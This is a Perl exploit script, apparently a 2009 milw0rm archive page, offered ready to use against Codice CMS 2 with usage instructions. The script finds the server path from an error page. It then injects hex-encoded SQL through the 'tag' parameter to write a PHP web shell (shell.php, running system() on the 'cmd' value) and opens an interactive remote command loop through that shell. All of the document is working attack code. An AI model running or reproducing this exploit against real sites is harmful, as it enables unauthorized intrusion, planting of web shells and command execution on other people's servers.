<html><head><title>Codice CMS 2 Remote SQL Command Execution Exploit</title></head><pre>#--+++===========================================================+++--
#--+++====== Codice CMS 2 Remote Command Execution Exploit ======+++--
#--+++===========================================================+++--


#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub banner
{
	print 	&quot;--+++===========================================================+++--\n&quot;.
		&quot;--+++====== Codice CMS 2 Remote Command Execution Exploit ======+++--\n&quot;.
		&quot;--+++===========================================================+++--\n\n&quot;;
}

sub usage
{
	die &quot;\n[+] Author   : darkjoker&quot;.
	     &quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
	     &quot;\n[+] Download: http://freefr.dl.sourceforge.net/sourceforge/codice/codice-dev-prev.zip&quot;.
	     &quot;\n[+] Usage   : perl $0 &lt;hostname&gt; &lt;path&gt;&quot;.
	     &quot;\n[+] Ex.     : perl $0 localhost /codiceCMS&quot;.
	     &quot;\n[+] 22-03-2009 Gigi D'Agostino allo Chalet, parco del Valentino, Torino!!&quot;.
	     &quot;\n\n&quot;;
}

sub dec2hex
{
	my $num = $_ [0];
	my $hex = sprintf (&quot;%x&quot;, $num);
	return $hex;
}

sub hex_format
{
	my $i = 0;
	my $hex;
	my @string = split '', $_ [0];
	while ($i &lt; scalar (@string))
	{
		$hex .= &quot;%&quot; . dec2hex (ord ($string [$i]));
		$i++;
	}
	return $hex;
}

sub get_script_path
{
	my ($hostname, $path) = @_;
	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $hostname, 
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	) or usage;
	my $get =  &quot;GET ${path}/index.php?id HTTP/1.1\r\n&quot;.
		   &quot;Host: ${hostname}\r\n&quot;.
		   &quot;Connection: Close\r\n\r\n&quot;;
	print $sock $get;
	my $src_path;
	while (&lt;$sock&gt;)
	{
		$src_path = $1 if ($_ =~ /resource in &lt;b&gt;(.+?)&lt;\/b&gt;/);
	}
	close ($sock);
	return ($src_path) ? $src_path : 0;
}

sub create_shell
{
	my ($hostname, $path, $query) = @_;
	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $hostname, 
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	) or usage;
	my $get = &quot;GET ${path}/index.php?tag=${query} HTTP/1.1\r\n&quot;.
		  &quot;Host: ${hostname}\r\n&quot;.
		  &quot;Connection: Close\r\n\r\n&quot;;
	print $sock $get;
	close ($sock);
}

banner ();
my ($hostname, $path) = @ARGV;
usage unless ($path);
my $shell_path = get_script_path ($hostname, $path);
$shell_path =~ s/index\.php$/shell\.php/;
my $query = 'x %\' UNION SELECT 1, \'&lt;?php system (stripslashes($_GET[\\\'cmd\\\'])); ?&gt;\', 3, 4, 5, 6, 7 INTO OUTFILE \''.$shell_path.'\' FROM cod_codice--';
$query = hex_format ($query);
create_shell ($hostname, $path, $query);
print &quot;Remember to delete 'shell.php' before exit!\n&quot;;
while (1)
{
	print &quot;nobody\@${hostname} &gt; &quot;;
	my $cmd = &lt;STDIN&gt;;
	chomp $cmd;
	die (&quot;Good bye!\n&quot;) if $cmd =~ /^quit$/;
	$cmd = hex_format ($cmd);
	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $hostname,
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	);
	my $req =  &quot;GET ${path}/shell.php?cmd=${cmd} HTTP/1.1\r\n&quot;.
		   &quot;Host: ${hostname}\r\n&quot;.
		   &quot;Connection: Close\r\n\r\n&quot;;
	print $sock $req;
	my $k;
	while (&lt;$sock&gt;)
	{
		chomp $_;
		$_ .= &quot;newline&quot;;
		$k .= $_;
	}
	$k =~ s/^.+1\t//;
	$k =~ s/\t3.+$//;
	$k = join (&quot;\n&quot;, split (&quot;newline&quot;, $k));
	print $k . &quot;\n&quot;;
	close ($sock);
}

# milw0rm.com [2009-03-23]</pre></html>